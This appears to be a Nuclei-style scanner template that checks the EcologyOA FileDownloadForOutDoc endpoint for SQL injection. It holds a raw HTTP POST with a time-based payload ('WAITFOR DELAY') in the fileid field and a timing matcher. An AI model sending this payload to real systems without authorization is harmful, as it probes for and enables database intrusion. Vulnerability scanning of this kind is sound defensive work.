id: ecology-oa-filedownloadforoutdoc-sqli
info:
  author: unknown
  description: EcologyOA filedownloadforoutdoc interface has SQL injection
  name: EcologyOA filedownloadforoutdoc - SQL injection
  severity: critical
  tags: ecology-oa,sqli
requests:
- matchers:
  - dsl:
    - duration>=5
    type: dsl
  raw:
  - "POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1\nHost: {{Hostname}}\n\
    Accept: */*\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n\
    Connection: close        \n\nfileid=2+WAITFOR DELAY+'0:0:5'&isFromOutImg=1\n"
